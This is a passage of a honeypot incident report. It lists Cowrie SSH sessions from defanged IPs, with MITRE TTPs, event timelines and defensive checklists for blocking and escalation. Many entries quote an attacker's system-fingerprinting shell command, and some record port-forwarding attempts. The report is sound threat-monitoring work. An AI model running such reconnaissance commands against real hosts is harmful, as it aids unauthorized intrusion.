| `2026-08-29 11:14:21` | `cowrie.session.params` |
| `2026-08-29 11:14:21` | `cowrie.command.input` |
| `2026-08-29 11:14:21` | `cowrie.command.input` |
| `2026-08-29 11:14:21` | `cowrie.command.input` |
| `2026-08-29 11:14:21` | `cowrie.command.input` |
| `2026-08-29 11:14:21` | `cowrie.command.input` |
| `2026-08-29 11:14:21` | `cowrie.command.success` |
| `2026-08-29 11:14:21` | `cowrie.command.input` |
| `2026-08-29 11:14:21` | `cowrie.command.input` |
| `2026-08-29 11:14:21` | `cowrie.command.input` |
| `2026-08-29 11:14:21` | `cowrie.command.input` |
| `2026-08-29 11:14:21` | `cowrie.log.closed` |
| `2026-08-29 11:14:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29b306b6edc7

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:15 |
| **Last Seen** | 2026-08-29 11:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:15:27` | `cowrie.session.connect` |
| `2026-08-29 11:15:27` | `cowrie.client.version` |
| `2026-08-29 11:15:27` | `cowrie.client.kex` |
| `2026-08-29 11:15:28` | `cowrie.login.success` |
| `2026-08-29 11:15:29` | `cowrie.session.params` |
| `2026-08-29 11:15:29` | `cowrie.command.input` |
| `2026-08-29 11:15:29` | `cowrie.command.input` |
| `2026-08-29 11:15:29` | `cowrie.command.input` |
| `2026-08-29 11:15:29` | `cowrie.command.input` |
| `2026-08-29 11:15:29` | `cowrie.command.input` |
| `2026-08-29 11:15:29` | `cowrie.command.success` |
| `2026-08-29 11:15:29` | `cowrie.command.input` |
| `2026-08-29 11:15:29` | `cowrie.command.input` |
| `2026-08-29 11:15:29` | `cowrie.command.input` |
| `2026-08-29 11:15:29` | `cowrie.command.input` |
| `2026-08-29 11:15:29` | `cowrie.log.closed` |
| `2026-08-29 11:15:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48480c123aac

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 11:16 |
| **Last Seen** | 2026-08-29 11:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:16:12` | `cowrie.session.connect` |
| `2026-08-29 11:16:12` | `cowrie.client.version` |
| `2026-08-29 11:16:12` | `cowrie.client.kex` |
| `2026-08-29 11:16:13` | `cowrie.login.success` |
| `2026-08-29 11:16:13` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:16:13` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 11:16:13` | `cowrie.direct-tcpip.data` |
| `2026-08-29 11:16:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fc79e77b2ee

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:16 |
| **Last Seen** | 2026-08-29 11:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:16:36` | `cowrie.session.connect` |
| `2026-08-29 11:16:36` | `cowrie.client.version` |
| `2026-08-29 11:16:36` | `cowrie.client.kex` |
| `2026-08-29 11:16:36` | `cowrie.login.success` |
| `2026-08-29 11:16:37` | `cowrie.session.params` |
| `2026-08-29 11:16:37` | `cowrie.command.input` |
| `2026-08-29 11:16:37` | `cowrie.command.input` |
| `2026-08-29 11:16:37` | `cowrie.command.input` |
| `2026-08-29 11:16:37` | `cowrie.command.input` |
| `2026-08-29 11:16:37` | `cowrie.command.input` |
| `2026-08-29 11:16:37` | `cowrie.command.success` |
| `2026-08-29 11:16:37` | `cowrie.command.input` |
| `2026-08-29 11:16:37` | `cowrie.command.input` |
| `2026-08-29 11:16:37` | `cowrie.command.input` |
| `2026-08-29 11:16:37` | `cowrie.command.input` |
| `2026-08-29 11:16:38` | `cowrie.log.closed` |
| `2026-08-29 11:16:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c638882caec

| Field | Detail |
|---|---|
| **Source IP** | `46.101.9[.]55` |
| **First Seen** | 2026-08-29 11:17 |
| **Last Seen** | 2026-08-29 11:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:17:16` | `cowrie.session.connect` |
| `2026-08-29 11:17:16` | `cowrie.client.version` |
| `2026-08-29 11:17:16` | `cowrie.client.kex` |
| `2026-08-29 11:17:17` | `cowrie.login.success` |
| `2026-08-29 11:17:17` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:17:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.9[.]55` to AbuseIPDB if not already reported
- [ ] Block `46.101.9[.]55` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b736425d2f3c

| Field | Detail |
|---|---|
| **Source IP** | `125.72.150[.]250` |
| **First Seen** | 2026-08-29 11:17 |
| **Last Seen** | 2026-08-29 11:17 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:17:23` | `cowrie.session.connect` |
| `2026-08-29 11:17:24` | `cowrie.client.version` |
| `2026-08-29 11:17:24` | `cowrie.client.kex` |
| `2026-08-29 11:17:29` | `cowrie.login.success` |
| `2026-08-29 11:17:30` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:17:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.72.150[.]250` to AbuseIPDB if not already reported
- [ ] Block `125.72.150[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-539fdc48ecd4

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:17 |
| **Last Seen** | 2026-08-29 11:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:17:45` | `cowrie.session.connect` |
| `2026-08-29 11:17:45` | `cowrie.client.version` |
| `2026-08-29 11:17:45` | `cowrie.client.kex` |
| `2026-08-29 11:17:46` | `cowrie.login.success` |
| `2026-08-29 11:17:47` | `cowrie.session.params` |
| `2026-08-29 11:17:47` | `cowrie.command.input` |
| `2026-08-29 11:17:47` | `cowrie.command.input` |
| `2026-08-29 11:17:47` | `cowrie.command.input` |
| `2026-08-29 11:17:47` | `cowrie.command.input` |
| `2026-08-29 11:17:47` | `cowrie.command.input` |
| `2026-08-29 11:17:47` | `cowrie.command.success` |
| `2026-08-29 11:17:47` | `cowrie.command.input` |
| `2026-08-29 11:17:47` | `cowrie.command.input` |
| `2026-08-29 11:17:47` | `cowrie.command.input` |
| `2026-08-29 11:17:47` | `cowrie.command.input` |
| `2026-08-29 11:17:47` | `cowrie.log.closed` |
| `2026-08-29 11:17:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c44fd65ad5fb

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 11:18 |
| **Last Seen** | 2026-08-29 11:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:18:24` | `cowrie.session.connect` |
| `2026-08-29 11:18:24` | `cowrie.client.version` |
| `2026-08-29 11:18:24` | `cowrie.client.kex` |
| `2026-08-29 11:18:25` | `cowrie.login.success` |
| `2026-08-29 11:18:25` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:18:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 11:18:25` | `cowrie.direct-tcpip.data` |
| `2026-08-29 11:18:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2b11a7d49c8

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:18 |
| **Last Seen** | 2026-08-29 11:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:18:55` | `cowrie.session.connect` |
| `2026-08-29 11:18:55` | `cowrie.client.version` |
| `2026-08-29 11:18:55` | `cowrie.client.kex` |
| `2026-08-29 11:18:56` | `cowrie.login.success` |
| `2026-08-29 11:18:57` | `cowrie.session.params` |
| `2026-08-29 11:18:57` | `cowrie.command.input` |
| `2026-08-29 11:18:57` | `cowrie.command.input` |
| `2026-08-29 11:18:57` | `cowrie.command.input` |
| `2026-08-29 11:18:57` | `cowrie.command.input` |
| `2026-08-29 11:18:57` | `cowrie.command.input` |
| `2026-08-29 11:18:57` | `cowrie.command.success` |
| `2026-08-29 11:18:57` | `cowrie.command.input` |
| `2026-08-29 11:18:57` | `cowrie.command.input` |
| `2026-08-29 11:18:57` | `cowrie.command.input` |
| `2026-08-29 11:18:57` | `cowrie.command.input` |
| `2026-08-29 11:18:57` | `cowrie.log.closed` |
| `2026-08-29 11:18:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5603515b5f79

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:20 |
| **Last Seen** | 2026-08-29 11:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:20:22` | `cowrie.session.connect` |
| `2026-08-29 11:20:22` | `cowrie.client.version` |
| `2026-08-29 11:20:22` | `cowrie.client.kex` |
| `2026-08-29 11:20:23` | `cowrie.login.success` |
| `2026-08-29 11:20:24` | `cowrie.session.params` |
| `2026-08-29 11:20:24` | `cowrie.command.input` |
| `2026-08-29 11:20:24` | `cowrie.command.input` |
| `2026-08-29 11:20:24` | `cowrie.command.input` |
| `2026-08-29 11:20:24` | `cowrie.command.input` |
| `2026-08-29 11:20:24` | `cowrie.command.input` |
| `2026-08-29 11:20:24` | `cowrie.command.success` |
| `2026-08-29 11:20:24` | `cowrie.command.input` |
| `2026-08-29 11:20:24` | `cowrie.command.input` |
| `2026-08-29 11:20:24` | `cowrie.command.input` |
| `2026-08-29 11:20:24` | `cowrie.command.input` |
| `2026-08-29 11:20:24` | `cowrie.log.closed` |
| `2026-08-29 11:20:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5bc867f3470

| Field | Detail |
|---|---|
| **Source IP** | `112.94.5[.]43` |
| **First Seen** | 2026-08-29 11:20 |
| **Last Seen** | 2026-08-29 11:20 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:20:33` | `cowrie.session.connect` |
| `2026-08-29 11:20:35` | `cowrie.client.version` |
| `2026-08-29 11:20:35` | `cowrie.client.kex` |
| `2026-08-29 11:20:38` | `cowrie.login.success` |
| `2026-08-29 11:20:40` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:20:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.94.5[.]43` to AbuseIPDB if not already reported
- [ ] Block `112.94.5[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce088e9bac0e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:21 |
| **Last Seen** | 2026-08-29 11:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:21:31` | `cowrie.session.connect` |
| `2026-08-29 11:21:31` | `cowrie.client.version` |
| `2026-08-29 11:21:31` | `cowrie.client.kex` |
| `2026-08-29 11:21:32` | `cowrie.login.success` |
| `2026-08-29 11:21:32` | `cowrie.session.params` |
| `2026-08-29 11:21:32` | `cowrie.command.input` |
| `2026-08-29 11:21:32` | `cowrie.command.input` |
| `2026-08-29 11:21:32` | `cowrie.command.input` |
| `2026-08-29 11:21:32` | `cowrie.command.input` |
| `2026-08-29 11:21:32` | `cowrie.command.input` |
| `2026-08-29 11:21:32` | `cowrie.command.success` |
| `2026-08-29 11:21:32` | `cowrie.command.input` |
| `2026-08-29 11:21:32` | `cowrie.command.input` |
| `2026-08-29 11:21:32` | `cowrie.command.input` |
| `2026-08-29 11:21:32` | `cowrie.command.input` |
| `2026-08-29 11:21:33` | `cowrie.log.closed` |
| `2026-08-29 11:21:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-889febd6d0bd

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:22 |
| **Last Seen** | 2026-08-29 11:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:22:32` | `cowrie.session.connect` |
| `2026-08-29 11:22:33` | `cowrie.client.version` |
| `2026-08-29 11:22:33` | `cowrie.client.kex` |
| `2026-08-29 11:22:33` | `cowrie.login.success` |
| `2026-08-29 11:22:34` | `cowrie.session.params` |
| `2026-08-29 11:22:34` | `cowrie.command.input` |
| `2026-08-29 11:22:34` | `cowrie.command.input` |
| `2026-08-29 11:22:34` | `cowrie.command.input` |
| `2026-08-29 11:22:34` | `cowrie.command.input` |
| `2026-08-29 11:22:34` | `cowrie.command.input` |
| `2026-08-29 11:22:34` | `cowrie.command.success` |
| `2026-08-29 11:22:34` | `cowrie.command.input` |
| `2026-08-29 11:22:34` | `cowrie.command.input` |
| `2026-08-29 11:22:34` | `cowrie.command.input` |
| `2026-08-29 11:22:34` | `cowrie.command.input` |
| `2026-08-29 11:22:35` | `cowrie.log.closed` |
| `2026-08-29 11:22:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ea4b80dd58a

| Field | Detail |
|---|---|
| **Source IP** | `201.208.172[.]85` |
| **First Seen** | 2026-08-29 11:23 |
| **Last Seen** | 2026-08-29 11:23 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:23:26` | `cowrie.session.connect` |
| `2026-08-29 11:23:28` | `cowrie.client.version` |
| `2026-08-29 11:23:28` | `cowrie.client.kex` |
| `2026-08-29 11:23:39` | `cowrie.login.success` |
| `2026-08-29 11:23:43` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:23:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.208.172[.]85` to AbuseIPDB if not already reported
- [ ] Block `201.208.172[.]85` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8b62b6ec280

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:23 |
| **Last Seen** | 2026-08-29 11:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:23:37` | `cowrie.session.connect` |
| `2026-08-29 11:23:37` | `cowrie.client.version` |
| `2026-08-29 11:23:37` | `cowrie.client.kex` |
| `2026-08-29 11:23:38` | `cowrie.login.success` |
| `2026-08-29 11:23:39` | `cowrie.session.params` |
| `2026-08-29 11:23:39` | `cowrie.command.input` |
| `2026-08-29 11:23:39` | `cowrie.command.input` |
| `2026-08-29 11:23:39` | `cowrie.command.input` |
| `2026-08-29 11:23:39` | `cowrie.command.input` |
| `2026-08-29 11:23:39` | `cowrie.command.input` |
| `2026-08-29 11:23:39` | `cowrie.command.success` |
| `2026-08-29 11:23:39` | `cowrie.command.input` |
| `2026-08-29 11:23:39` | `cowrie.command.input` |
| `2026-08-29 11:23:39` | `cowrie.command.input` |
| `2026-08-29 11:23:39` | `cowrie.command.input` |
| `2026-08-29 11:23:40` | `cowrie.log.closed` |
| `2026-08-29 11:23:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4666b28a9383

| Field | Detail |
|---|---|
| **Source IP** | `103.129.59[.]62` |
| **First Seen** | 2026-08-29 11:23 |
| **Last Seen** | 2026-08-29 11:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:23:45` | `cowrie.session.connect` |
| `2026-08-29 11:23:46` | `cowrie.client.version` |
| `2026-08-29 11:23:46` | `cowrie.client.kex` |
| `2026-08-29 11:23:48` | `cowrie.login.success` |
| `2026-08-29 11:23:49` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:23:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.129.59[.]62` to AbuseIPDB if not already reported
- [ ] Block `103.129.59[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2492c038d6ba

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:24 |
| **Last Seen** | 2026-08-29 11:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
